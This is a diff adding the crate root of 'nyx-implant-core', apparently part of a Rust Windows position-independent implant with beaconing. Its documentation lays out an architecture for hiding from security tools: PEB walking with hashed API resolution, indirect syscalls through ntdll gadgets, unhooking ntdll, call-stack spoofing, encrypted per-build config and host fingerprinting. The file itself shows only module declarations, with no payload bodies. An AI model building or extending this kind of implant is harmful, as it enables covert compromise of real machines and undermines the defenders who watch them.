@@ -1,0 +1,62 @@
+//! nyx-implant-core — core layer of the Windows PIC implant.
+//!
+//! Extracted from `nyx-implant-win` (WP-C crate split): the lowest layer of the
+//! implant DAG (`core ← evasion ← net ← tasks ← shell`). Everything here is
+//! consumed upward by the shell crate (and later by the evasion/net/tasks
+//! crates); nothing here may depend on those higher layers.
+//!
+//! This crate is `#![no_std]` like the shell, but deliberately does NOT carry
+//! the globally-unique items (`#![no_main]`, `#[global_allocator]`,
+//! `#[panic_handler]`, `#[alloc_error_handler]`) — those stay in the shell
+//! cdylib (`nyx-implant-win`), which registers [`ntalloc::NtHeapAllocator`] as
+//! the global allocator so `alloc` works for this crate too.
+//!
+//! ## Modules
+//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
+//! - [`ntalloc`] — bump allocator over `NtAllocateVirtualMemory`, registered as
+//!   the `#[global_allocator]` by the shell (the `NtHeapAllocator` name is
+//!   historical).
+//! - [`resolve`] — PEB walk + djb2 API resolution; `LiveNtdll` impls
+//!   `nyx_evasion::SyscallSource` so the SSN resolver runs over the *live* ntdll.
+//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll `syscall;ret`
+//!   gadget + RX trampoline); 4/6/11-arg wrappers + a process-wide global.
+//! - [`unhook`] — KnownDlls `\ntdll` fresh-map (+ disk fallback) unhook.
+//! - [`config`] — per-build encrypted config (baked by this crate's build.rs).
+//! - [`hostinfo`] — real `SessionInfo` (hostname/user/pid/admin/beacon_id).
+//! - [`cell`] — `SyncCell`: single-threaded-beacon static cell (see its module
+//!   docs for the safety contract — it is a cross-crate API contract now).
+//! - [`fmt`] — minimal decimal formatting helpers (no `format!` under no_std).
+//! - [`stack`] / [`version`] / [`context`] / [`diag`] — call-stack spoof,
+//!   Windows build detection, x64 CONTEXT record, diagnostics + CSPRNG.
+
+#![cfg_attr(not(test), no_std)]
+
+extern crate alloc;
+
+pub mod heap;
+
+#[cfg(target_os = "windows")]
+pub mod cell;
+#[cfg(target_os = "windows")]
+pub mod config;
+#[cfg(target_os = "windows")]
+pub mod context;
+#[cfg(target_os = "windows")]
+pub mod diag;
+
+pub mod fmt;
+
+#[cfg(target_os = "windows")]
+pub mod hostinfo;
+#[cfg(target_os = "windows")]
+pub mod ntalloc;
+#[cfg(target_os = "windows")]
+pub mod resolve;
+#[cfg(target_os = "windows")]
+pub mod stack;
+#[cfg(target_os = "windows")]
+pub mod syscalls;
+#[cfg(target_os = "windows")]
+pub mod unhook;
+#[cfg(target_os = "windows")]
+pub mod version;
